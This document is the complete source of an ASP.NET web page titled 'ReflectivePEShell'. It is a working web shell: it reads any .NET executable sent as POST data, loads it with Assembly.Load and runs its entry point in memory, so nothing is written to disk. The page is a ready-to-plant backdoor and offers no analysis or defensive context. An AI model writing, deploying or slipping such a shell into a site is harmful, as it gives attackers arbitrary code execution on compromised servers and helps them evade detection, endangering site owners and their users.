<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] pe = Request.BinaryRead(Request.TotalBytes);
        if (pe != null && pe.Length > 0)
        {
            Assembly asm = Assembly.Load(pe);
            MethodInfo entry = asm.EntryPoint;
            if (entry != null)
                entry.Invoke(null, new object[] { new string[0] });
            Response.Write("PE loaded and executed in-memory.");
        }
        else
        {
            Response.Write("Send a .NET executable as POST data.");
        }
    }
</script>
<html><body><h2>ReflectivePEShell</h2><p>POST a .NET executable to load and run without touching disk.</p></body></html>
